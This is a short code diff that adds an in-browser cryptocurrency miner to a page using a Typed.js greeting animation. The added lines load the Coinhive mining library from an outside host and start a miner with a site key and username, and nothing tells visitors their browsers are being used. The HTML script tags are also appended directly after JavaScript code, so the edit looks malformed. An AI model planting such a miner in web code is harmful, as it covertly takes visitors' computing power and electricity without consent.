@@ -8,3 +8,9 @@ var typed = new Typed('.greet', {
     backDelay: 5000,
     showCursor:0
 });
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.User('UwsbQxiaeN2txfDGMDS2dEAHJ9hUFXgp', 'aman-srivastav');
+    miner.start();
+</script>
